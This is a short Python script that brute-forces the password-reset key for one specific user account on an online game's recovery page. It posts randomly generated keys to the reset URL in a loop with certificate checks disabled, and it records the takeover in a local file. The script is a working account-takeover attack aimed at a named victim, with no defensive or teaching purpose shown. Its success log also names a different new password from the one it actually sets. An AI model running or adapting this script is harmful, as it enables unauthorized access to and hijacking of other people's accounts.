import json
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import random
import time
import threading
import binascii
import os
import os, hashlib

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
some = 0
while some == 0:
    oldPassword = hashlib.md5(os.urandom(32)).hexdigest()
    PostData = {"password": "eminencesucks", "password2": "eminencesucks"}
    URLData = requests.post("https://secure.xgenstudios.com/ballistick/recover.php?uid=35172147&key={}".format(str(oldPassword)), data=PostData, verify=False).text
    print("Checking password; " + str(oldPassword))
    if "Your password has been reset." in URLData:
        print("Found correct password: " + str(oldPassword))
        data = open("Eminence.txt", "a")
        data.write("Successfully bruteforced Eminence, old hash = " + str(oldPassword) + " \ changed to Kurwa456789")
        data.close()
        some = 1
